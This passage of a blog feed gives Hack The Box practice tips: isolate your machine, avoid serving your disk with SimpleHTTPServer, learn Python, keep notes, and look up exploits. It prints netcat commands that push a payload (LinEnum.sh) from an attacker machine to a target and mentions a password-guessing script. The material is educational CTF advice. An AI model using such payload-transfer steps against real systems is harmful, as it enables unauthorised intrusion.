+It&#8217;s quite different also for the reverse engineering. Especially reversing unknown (potential) malware is something I would approach with extreme caution. Just single-stepping and setting breakpoints in a debugger would not be enough to contain a malicious binary.<br />
+So if you want to practice for real life scenarios, I would suggest that instead of going straight for the flag, you should practice the same precautions and steps you would need in the real world. Having fun is perfectly fine, nothing wrong with that.</p>
+<h1>Don&#8217;t get accidentally exposed!</h1>
+<p>As a first step, don&#8217;t hack with your important machine. As a minimum, shut down the VPN when not using it and use a virtual machine (or a burner machine) when you connect to a potentially hostile unknown network.<br />
+A lot of people seem to be running <strong><em>python -m SimpleHTTPServer</em></strong>&nbsp;or something similar to host the payloads to be downloaded by the target machine. Please consider that there are other hackers working on the same machine and if you expose your hard disk to the target machine, someone else could download something interesting from your computer. Like, say, your private ssh key. <strong><em>SimpleHTTPServer</em></strong> is super handy, but it does not care about security!<br />
+Either work with something which only allows downloading your <em>exploit.exe</em> or immediately shut down the server after your tools have been downloaded on the target.<br />
+Here&#8217;s a way to do it with <em><strong>netcat</strong></em>:</p>
+<blockquote><p>1. On the target, start listening:<br />
+nc -l 8080 &gt; bash.sh<br />
+2. On your attacker machine, send your evil payload:<br />
+nc -w 3 localhost 8080 &lt; LinEnum.sh</p></blockquote>
+<p>Whether this trick works depends on the firewall rules, but as a minimal precaution, shut down your server on your machine immediately after the file transfer.</p>
+<h1>Some final tips and ideas</h1>
+<h2>Tip 1: Learn Python</h2>
+<p>Python is great for quickly cooking up some automation and helper programs. You don&#8217;t need static types or classes to structure your code. But make no mistake: Python is definitely a serious programming language and not just a &#8220;scripting language&#8221;.<br />
+Here&#8217;s an example from a script I wrote to automate guessing passwords and users for a certain service.<br />
+<img decoding="async" class="alignnone size-full wp-image-1279" src="https://rot.fi/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405.png" alt="Screen-Shot-2018-03-07-at-14.39.05.png" width="2246" height="1500" srcset="/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405.png 2246w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-300x200.png 300w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1030x688.png 1030w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-768x513.png 768w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1536x1026.png 1536w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-2048x1368.png 2048w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1500x1002.png 1500w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-705x471.png 705w" sizes="(max-width: 2246px) 100vw, 2246px" /></p>
+<h2>Tip 2: Keep notes</h2>
+<p>Keep notes on the challenges and machines. I have a subfolder for each machine with more or less incoherent notes on what I have found and what I haven&#8217;t yet figured out about the machine. I may put this stuff on a private git repository to get it better organized.</p>
+<h2>Tip 3: Use the google</h2>
+<p>This is kind of obvious, but enumerate the versions and search for possible exploits in <a href="https://www.exploit-db.com/">exploit-db</a> and other places. I precompiled some exploits already and kept the binary executables in addition to source code. I might need some sort of Excel sheet or something to keep track of these if there are more to come.</p>
+<h1>Happy hacking!</h1>
+<p>It&#8217;s worth mentioning that <strong>Hack The Box </strong>contains&nbsp;more than just binary reverse engineering and pwning machines.&nbsp;I left out advice for some challenges, like steganography, which I haven&#8217;t really done. I&#8217;m not qualified to give any advice on that.<br />
+If you now feel the itch to try out some &#8220;real&#8221; hacking, please do. The best way to learn is by doing and <strong>Hack The Box</strong> is a great platform to practice on.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+	</channel>
+</rss>
